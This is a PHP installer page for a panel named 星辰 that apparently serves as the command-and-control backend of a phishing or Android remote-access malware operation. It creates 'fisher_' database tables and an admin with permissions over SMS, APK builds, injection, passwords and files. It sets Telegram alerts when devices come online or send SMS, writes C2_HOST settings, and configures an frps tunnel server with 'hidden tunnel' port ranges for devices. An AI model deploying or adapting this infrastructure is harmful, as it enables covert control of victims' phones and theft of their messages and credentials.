<?php
declare(strict_types=1);

// 星辰 one-page installer. Delete or lock this file after installation.
error_reporting(E_ALL);
ini_set('display_errors', '1');

$root = dirname(__DIR__);
$lockFile = $root . '/runtime/install.lock';
$schemaFile = $root . '/install/schema.sql';
$envFile = $root . '/.env';
$messages = [];
$errors = [];

function h($value): string { return htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'); }
function postv(string $key, string $default = ''): string { return trim((string)($_POST[$key] ?? $default)); }
function random_secret(): string { return bin2hex(random_bytes(32)); }

function existing_install_detected(string $envFile): bool {
    if (!is_file($envFile) || !extension_loaded('pdo_mysql')) return false;
    $env = @parse_ini_file($envFile, true, INI_SCANNER_RAW);
    if (!is_array($env)) return false;
    $db = $env['DATABASE'] ?? [];
    $host = trim((string)($db['HOSTNAME'] ?? '127.0.0.1'));
    $port = trim((string)($db['HOSTPORT'] ?? '3306'));
    $name = trim((string)($db['DB_NAME'] ?? $db['DATABASE'] ?? ''));
    $user = trim((string)($db['USERNAME'] ?? ''));
    $pass = trim((string)($db['PASSWORD'] ?? ''));
    if ($name === '' || $user === '') return false;
    try {
        $pdo = new PDO("mysql:host=$host;port=$port;dbname=$name;charset=utf8mb4", $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $table = $pdo->query("SHOW TABLES LIKE 'fisher_users'")->fetchColumn();
        if (!$table) return false;
        return (int)$pdo->query('SELECT COUNT(*) FROM fisher_users')->fetchColumn() > 0;
    } catch (Throwable $e) {
        return false;
    }
}
function valid_username(string $username): bool { return (bool)preg_match('/^[A-Za-z0-9_.-]{3,64}$/', $username); }
function valid_chat_id(string $chatId): bool { return $chatId === '' || (bool)preg_match('/^-?\d{5,20}$/', $chatId); }
function valid_bot_token(string $token): bool { return $token === '' || (bool)preg_match('/^\d{5,20}:[A-Za-z0-9_-]{20,}$/', $token); }
function valid_server_host(string $host): bool {
    return (bool)preg_match('/^(?:[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?|\[[0-9A-Fa-f:]+\]|[0-9A-Fa-f:]+)$/', $host);
}
function valid_port(string $port): bool {
    return ctype_digit($port) && (int)$port >= 1 && (int)$port <= 65535;
}
function valid_frps_secret(string $value): bool { return (bool)preg_match('/^[A-Za-z0-9_.:@-]+$/', $value); }

function upsert_setting(PDO $pdo, string $key, string $value, int $now): void {
    $sql = "INSERT INTO fisher_settings (`key`,`value`,`created_at`,`updated_at`) VALUES (?,?,?,?) "
        . "ON DUPLICATE KEY UPDATE `value`=VALUES(`value`), `updated_at`=VALUES(`updated_at`)";
    $pdo->prepare($sql)->execute([$key, $value, $now, $now]);
}

function import_schema(PDO $pdo, string $schemaFile): int {
    if (!is_file($schemaFile)) {
        throw new RuntimeException('缺少 install/schema.sql');
    }
    $sql = file_get_contents($schemaFile);
    if ($sql === false || trim($sql) === '') {
        throw new RuntimeException('install/schema.sql 为空');
    }
    $count = 0;
    foreach (explode(';', $sql) as $stmt) {
        $stmt = trim($stmt);
        if ($stmt === '' || str_starts_with($stmt, '--')) continue;
        $pdo->exec($stmt);
        $count++;
    }
    return $count;
}

function write_env_file(string $envFile, array $cfg): void {
    $existing = is_file($envFile) ? file_get_contents($envFile) : '';
    $appDebug = preg_match('/^APP_DEBUG\s*=\s*([^\r\n]+)/m', (string)$existing, $m) ? trim($m[1]) : 'false';
    $appTrace = preg_match('/^APP_TRACE\s*=\s*([^\r\n]+)/m', (string)$existing, $m) ? trim($m[1]) : 'false';
    $content = "APP_DEBUG = {$appDebug}\nAPP_TRACE = {$appTrace}\n\n";
    $content .= "[APP]\nDEFAULT_TIMEZONE = Asia/Shanghai\n\n";
    $content .= "[DATABASE]\n";
    $content .= "TYPE = mysql\n";
    $content .= "HOSTNAME = {$cfg['db_host']}\n";
    $content .= "DB_NAME = {$cfg['db_name']}\n";
    $content .= "DATABASE = {$cfg['db_name']}\n";
    $content .= "USERNAME = {$cfg['db_user']}\n";
    $content .= "PASSWORD = {$cfg['db_pass']}\n";
    $content .= "HOSTPORT = {$cfg['db_port']}\n";
    $content .= "CHARSET = utf8mb4\n";
    $content .= "PREFIX = fisher_\n\n";
    $content .= "[JWT]\nJWT_SECRET = {$cfg['jwt_secret']}\n\n";
    $content .= "[SERVER]\nWS_HOST = 127.0.0.1\nWS_PORT = 8889\n\n";
    $content .= "[FRPS]\n";
    $content .= "FRPS_ADDR = {$cfg['frps_addr']}\n";
    $content .= "FRPS_PORT = {$cfg['frps_port']}\n";
    $content .= "FRPS_TOKEN = {$cfg['frps_token']}\n";
    $content .= "FRPS_REMOTE_PORT_MIN = {$cfg['frps_remote_port_min']}\n";
    $content .= "FRPS_REMOTE_PORT_MAX = {$cfg['frps_remote_port_max']}\n";
    $content .= "DEFAULT_REMOTE_PORT = 19901\n";
    $content .= "LOCAL_SERVICE_PORT = 7912\n";
    $content .= "FRPS_DASHBOARD_HOST = 127.0.0.1\n";
    $content .= "FRPS_DASHBOARD_PORT = {$cfg['frps_dashboard_port']}\n";
    $content .= "FRPS_DASHBOARD_USER = {$cfg['frps_dashboard_user']}\n";
    $content .= "FRPS_DASHBOARD_PASSWORD = {$cfg['frps_dashboard_password']}\n\n";
    $content .= "[EXTERNAL]\n";
    $content .= "EXTERNAL_HOST = {$cfg['frps_addr']}\n";
    $content .= "EXTERNAL_PORT = 8889\n";
    $content .= "C2_HOST = http://{$cfg['frps_addr']}:8889\n";
    $content .= "C2_WS_HOST = ws://{$cfg['frps_addr']}:8889\n";
    if (file_put_contents($envFile, $content, LOCK_EX) === false) {
        throw new RuntimeException('写入项目根目录 .env 失败');
    }
    @chmod($envFile, 0640);
}

function link_node_env(string $root, string $envFile): void {
    $nodeEnv = $root . '/node-ws/.env';
    if (is_link($nodeEnv) && readlink($nodeEnv) === '../.env') return;
    if (file_exists($nodeEnv) || is_link($nodeEnv)) {
        if (!@unlink($nodeEnv)) throw new RuntimeException('无法替换 node-ws/.env');
    }
    if (!@symlink('../.env', $nodeEnv)) {
        if (!@copy($envFile, $nodeEnv)) throw new RuntimeException('无法让 Node WS 共用根目录 .env');
    }
}

$alreadyLocked = is_file($lockFile) || existing_install_detected($envFile);
if ($alreadyLocked && !is_file($lockFile) && is_dir(dirname($lockFile))) { @file_put_contents($lockFile, 'installed_at=' . date('c') . "\nauto_detected=1\n", LOCK_EX); }
$defaults = [
    'db_host' => '127.0.0.1',
    'db_port' => '3306',
    'db_name' => '',
    'db_user' => '',
    'db_pass' => '',
    'admin_user' => 'admin',
    'admin_pass' => '',
    'bot_token' => '',
    'chat_id' => '',
    'api_proxy' => '',
    'frontend_url' => (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . ($_SERVER['HTTP_HOST'] ?? ''),
    'backend_url' => (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . ($_SERVER['HTTP_HOST'] ?? ''),
    'node_ws_url' => ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'wss://' : 'ws://') . ($_SERVER['HTTP_HOST'] ?? '') . '/ws/',
    'frps_addr' => preg_replace('/:\d+$/', '', (string)($_SERVER['HTTP_HOST'] ?? '')),
    'frps_port' => '7000',
    'frps_token' => random_secret(),
    'frps_remote_port_min' => '19902',
    'frps_remote_port_max' => '29999',
    'frps_dashboard_port' => '7500',
    'frps_dashboard_user' => 'admin',
    'frps_dashboard_password' => random_secret(),
    'force' => '',
];
$data = array_merge($defaults, array_intersect_key($_POST, $defaults));

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$alreadyLocked) {
    foreach (['db_host','db_port','db_name','db_user','admin_user','admin_pass','frps_addr','frps_token','frps_dashboard_user','frps_dashboard_password'] as $key) {
        if (postv($key) === '') $errors[] = $key . ' 不能为空';
    }
    if (!valid_username(postv('admin_user'))) $errors[] = '管理员账号需为 3-64 位字母/数字/下划线/点/短横线';
    if (strlen(postv('admin_pass')) < 6) $errors[] = '管理员密码至少 6 位';
    if (!valid_bot_token(postv('bot_token'))) $errors[] = '机器人 Token 格式不正确';
    if (!valid_chat_id(postv('chat_id'))) $errors[] = 'Telegram 用户 Chat ID 格式不正确';
    if (!valid_server_host(postv('frps_addr'))) $errors[] = 'FRPS 对外地址只能填公网 IP 或域名，不要带 http:// 和端口';
    foreach (['frps_port','frps_remote_port_min','frps_remote_port_max','frps_dashboard_port'] as $key) {
        if (!valid_port(postv($key))) $errors[] = $key . ' 不是有效端口';
    }
    if (valid_port(postv('frps_remote_port_min')) && valid_port(postv('frps_remote_port_max')) && (int)postv('frps_remote_port_min') > (int)postv('frps_remote_port_max')) {
        $errors[] = '隐道端口起始值不能大于结束值';
    }
    if (strlen(postv('frps_token')) < 32) $errors[] = 'FRPS Token 至少 32 个字符';
    foreach (['frps_token','frps_dashboard_user','frps_dashboard_password'] as $key) {
        if (postv($key) !== '' && !valid_frps_secret(postv($key))) $errors[] = $key . ' 只能包含字母、数字、点、下划线、冒号、@ 和短横线';
    }
    if (!extension_loaded('pdo_mysql')) $errors[] = '服务器缺少 pdo_mysql 扩展';

    if (!$errors) {
        try {
            $cfg = [
                'db_host' => postv('db_host'),
                'db_port' => postv('db_port'),
                'db_name' => postv('db_name'),
                'db_user' => postv('db_user'),
                'db_pass' => postv('db_pass'),
                'jwt_secret' => random_secret(),
                'frps_addr' => postv('frps_addr'),
                'frps_port' => postv('frps_port'),
                'frps_token' => postv('frps_token'),
                'frps_remote_port_min' => postv('frps_remote_port_min'),
                'frps_remote_port_max' => postv('frps_remote_port_max'),
                'frps_dashboard_port' => postv('frps_dashboard_port'),
                'frps_dashboard_user' => postv('frps_dashboard_user'),
                'frps_dashboard_password' => postv('frps_dashboard_password'),
            ];
            $pdo = new PDO(
                "mysql:host={$cfg['db_host']};port={$cfg['db_port']};dbname={$cfg['db_name']};charset=utf8mb4",
                $cfg['db_user'],
                $cfg['db_pass'],
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]
            );
            $pdo->exec('SET NAMES utf8mb4');

            if (postv('force') === '1') {
                $tables = $pdo->query("SHOW TABLES LIKE 'fisher_%'")->fetchAll(PDO::FETCH_COLUMN);
                $pdo->exec('SET FOREIGN_KEY_CHECKS=0');
                foreach ($tables as $table) {
                    if (preg_match('/^fisher_[A-Za-z0-9_]+$/', $table)) $pdo->exec("DROP TABLE IF EXISTS `{$table}`");
                }
                $pdo->exec('SET FOREIGN_KEY_CHECKS=1');
                $messages[] = '已按要求清空旧 fisher_ 表';
            }

            $stmtCount = import_schema($pdo, $GLOBALS['schemaFile']);
            $messages[] = '数据库结构导入完成：' . $stmtCount . ' 条语句';

            $now = time();
            $adminUser = postv('admin_user');
            $adminPass = postv('admin_pass');
            $chatId = postv('chat_id');
            $botToken = postv('bot_token');
            $apiProxy = postv('api_proxy');
            $permissions = json_encode(['dashboard','control','sms','apk','settings','injection','node','passwords','files','ai','logs','accounts'], JSON_UNESCAPED_UNICODE);

            $existing = $pdo->prepare('SELECT id FROM fisher_users WHERE username=? LIMIT 1');
            $existing->execute([$adminUser]);
            $row = $existing->fetch();
            if ($row) {
                $adminId = (int)$row['id'];
                $pdo->prepare('UPDATE fisher_users SET password_hash=?, role=?, permissions=?, max_devices=9999, max_sub_users=999, parent_username="", enabled=1, expire_at=0, avatar=?, telegram_chat_id=?, updated_at=? WHERE id=?')
                    ->execute([password_hash($adminPass, PASSWORD_BCRYPT), 'superadmin', $permissions, '/assets/img/mx_logo.png', $chatId, $now, $adminId]);
            } else {
                $pdo->prepare('INSERT INTO fisher_users (username,password_hash,role,permissions,max_devices,max_sub_users,parent_username,enabled,expire_at,avatar,telegram_chat_id,last_login_at,created_at,updated_at) VALUES (?,?,?,?,9999,999,"",1,0,?,?,0,?,?)')
                    ->execute([$adminUser, password_hash($adminPass, PASSWORD_BCRYPT), 'superadmin', $permissions, '/assets/img/mx_logo.png', $chatId, $now, $now]);
                $adminId = (int)$pdo->lastInsertId();
            }

            if ($botToken !== '') upsert_setting($pdo, 'tg_' . $adminId . '_bot_token', $botToken, $now);
            if ($chatId !== '') {
                upsert_setting($pdo, 'tg_' . $adminId . '_chat_id', $chatId, $now);
                upsert_setting($pdo, 'tg_user_' . $adminUser . '_chat_id', $chatId, $now);
                upsert_setting($pdo, 'chat_id', $chatId, $now);
            }
            if ($botToken !== '') upsert_setting($pdo, 'bot_token', $botToken, $now);
            if ($apiProxy !== '') {
                upsert_setting($pdo, 'tg_' . $adminId . '_api_proxy', $apiProxy, $now);
                upsert_setting($pdo, 'api_proxy', $apiProxy, $now);
            }
            upsert_setting($pdo, 'sys_jwt_secret', $cfg['jwt_secret'], $now);
            upsert_setting($pdo, 'sys_frontend_url', postv('frontend_url'), $now);
            upsert_setting($pdo, 'sys_backend_url', postv('backend_url'), $now);
            upsert_setting($pdo, 'sys_node_ws_url', postv('node_ws_url'), $now);
            upsert_setting($pdo, 'sys_frps_addr', $cfg['frps_addr'], $now);
            upsert_setting($pdo, 'sys_frps_port', $cfg['frps_port'], $now);
            upsert_setting($pdo, 'sys_open_registration', '0', $now);
            upsert_setting($pdo, 'sys_default_role', 'user', $now);
            upsert_setting($pdo, 'sys_default_max_devices', '100', $now);
            upsert_setting($pdo, 'notify_online', '1', $now);
            upsert_setting($pdo, 'notify_sms', '1', $now);
            upsert_setting($pdo, 'apk_build_state', '{"is_building":false,"progress":100,"message":"ready","logs":[]}', $now);
            upsert_setting($pdo, 'cdn_config', '{"type":"local"}', $now);
            upsert_setting($pdo, 'bt_deploy_config', '{"enabled":false}', $now);
            upsert_setting($pdo, 'auto_build_config', '{"enabled":false}', $now);
            upsert_setting($pdo, 'auto_build_targets', '[]', $now);

            write_env_file($envFile, $cfg);
            link_node_env($root, $envFile);
            if (!is_dir(dirname($lockFile))) mkdir(dirname($lockFile), 0755, true);
            file_put_contents($lockFile, "installed_at=" . date('c') . "\nadmin={$adminUser}\n", LOCK_EX);
            $alreadyLocked = true;
            $messages[] = '安装完成，管理员已创建/更新';
        } catch (Throwable $e) {
            $errors[] = $e->getMessage();
        }
    }
}
?>
<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>星辰 安装向导</title>
<style>
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial;background:#16001f;color:#f8f3ff}.wrap{max-width:860px;margin:36px auto;padding:28px;background:rgba(255,255,255,.06);border:1px solid rgba(190,80,255,.35);border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.35)}h1{margin:0 0 8px;font-size:30px}.hint{color:#cbb6ff;margin-bottom:22px}.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}label{display:block;font-size:14px;color:#d8c7ff;margin-bottom:6px}input{box-sizing:border-box;width:100%;padding:12px;border-radius:10px;border:1px solid #5b356d;background:#21062d;color:#fff}button{margin-top:18px;width:100%;padding:14px;border:0;border-radius:12px;background:linear-gradient(90deg,#2673ff,#a43df5);color:#fff;font-weight:700;font-size:16px}.box{padding:12px;border-radius:10px;margin:10px 0}.ok{background:#08351f;color:#bdf8d4}.err{background:#4b1111;color:#ffd4d4}.full{grid-column:1/-1}.small{font-size:13px;color:#bba7db}.disabled{opacity:.65}code{color:#ffd479}@media(max-width:720px){.grid{grid-template-columns:1fr}.wrap{margin:12px}}</style>
</head><body><main class="wrap">
<h1>星辰 安装向导</h1><div class="hint">初始化数据库、管理员、共享 .env 和内置 frps 配置。</div>
<?php foreach ($messages as $m): ?><div class="box ok"><?=h($m)?></div><?php endforeach; ?>
<?php foreach ($errors as $e): ?><div class="box err"><?=h($e)?></div><?php endforeach; ?>
<?php if ($alreadyLocked): ?>
  <div class="box ok">系统已安装。锁文件：<code>runtime/install.lock</code></div>
  <div class="box ok">在服务器终端执行一次：<br><code>sudo bash <?=h($root)?>/deploy/install-frps.sh</code></div>
  <p class="small">如需重新安装，请先备份数据，再删除 <code>runtime/install.lock</code> 后访问本页。</p>
  <p><a style="color:#9fd4ff" href="/">进入系统</a></p>
<?php else: ?>
<form method="post" autocomplete="off">
  <div class="grid">
    <div><label>数据库地址</label><input name="db_host" value="<?=h($data['db_host'])?>" required></div>
    <div><label>数据库端口</label><input name="db_port" value="<?=h($data['db_port'])?>" required></div>
    <div><label>数据库名</label><input name="db_name" value="<?=h($data['db_name'])?>" required></div>
    <div><label>数据库用户</label><input name="db_user" value="<?=h($data['db_user'])?>" required></div>
    <div class="full"><label>数据库密码</label><input type="password" name="db_pass" value="<?=h($data['db_pass'])?>"></div>
    <div><label>管理员账号</label><input name="admin_user" value="<?=h($data['admin_user'])?>" required></div>
    <div><label>管理员密码</label><input type="password" name="admin_pass" value="<?=h($data['admin_pass'])?>" required></div>
    <div class="full"><label>Telegram Bot Token</label><input name="bot_token" value="<?=h($data['bot_token'])?>" placeholder="123456:ABC..."></div>
    <div><label>管理员 Telegram Chat ID</label><input name="chat_id" value="<?=h($data['chat_id'])?>" placeholder="例如 123456789"></div>
    <div><label>Telegram API 代理，可空</label><input name="api_proxy" value="<?=h($data['api_proxy'])?>" placeholder="http://127.0.0.1:7890"></div>
    <div class="full"><label>前端地址</label><input name="frontend_url" value="<?=h($data['frontend_url'])?>"></div>
    <div class="full"><label>后端地址</label><input name="backend_url" value="<?=h($data['backend_url'])?>"></div>
    <div class="full"><label>Node WebSocket 地址</label><input name="node_ws_url" value="<?=h($data['node_ws_url'])?>"></div>
    <div class="full"><label>FRPS 对外公网 IP 或域名（不带协议/端口）</label><input name="frps_addr" value="<?=h($data['frps_addr'])?>" required></div>
    <div><label>FRPS 服务端口</label><input name="frps_port" value="<?=h($data['frps_port'])?>" required></div>
    <div><label>FRPS Token（自动生成）</label><input type="password" name="frps_token" value="<?=h($data['frps_token'])?>" required></div>
    <div><label>设备隐道端口起始</label><input name="frps_remote_port_min" value="<?=h($data['frps_remote_port_min'])?>" required></div>
    <div><label>设备隐道端口结束</label><input name="frps_remote_port_max" value="<?=h($data['frps_remote_port_max'])?>" required></div>
    <div><label>FRPS 面板端口</label><input name="frps_dashboard_port" value="<?=h($data['frps_dashboard_port'])?>" required></div>
    <div><label>FRPS 面板用户</label><input name="frps_dashboard_user" value="<?=h($data['frps_dashboard_user'])?>" required></div>
    <div><label>FRPS 面板密码（自动生成）</label><input type="password" name="frps_dashboard_password" value="<?=h($data['frps_dashboard_password'])?>" required></div>
    <div class="full small"><label><input style="width:auto" type="checkbox" name="force" value="1"> 清空旧 fisher_ 表后重新安装</label></div>
  </div>
  <button type="submit">开始安装</button>
</form>
<p class="small">安装成功后会生成唯一的根目录 <code>.env</code>。再执行页面给出的一条 sudo 命令，即会从项目内置包安装、配置并启动 frps。</p>
<?php endif; ?>
</main></body></html>
